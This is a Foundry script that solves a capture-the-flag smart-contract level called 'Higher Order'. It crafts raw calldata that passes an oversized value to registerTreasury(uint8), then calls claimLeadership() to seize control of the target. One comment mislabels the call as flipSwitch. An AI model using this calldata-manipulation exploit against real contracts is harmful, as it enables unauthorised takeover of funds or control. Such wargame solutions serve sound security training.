// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                     LEVEL 30 - HIGHER ORDER                  │
// ================================================================

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        bytes4 registerTreasurySelector = bytes4(keccak256("registerTreasury(uint8)"));

        bytes memory callData = abi.encodePacked(
            registerTreasurySelector, // 4 bytes - registerTreasury function selector
            uint256(0x1F4) // 32 bytes - the value 500
        );

        // Call flipSwitch with this manipulated data
        (bool success,) = targetContractAddress.call(callData);
        require(success, "Call failed");

        (bool claimLeadershipSuccess,) =
            targetContractAddress.call(abi.encodePacked(bytes4(keccak256("claimLeadership()"))));
        require(claimLeadershipSuccess, "Claim leadership failed");

        vm.stopBroadcast();
    }
}
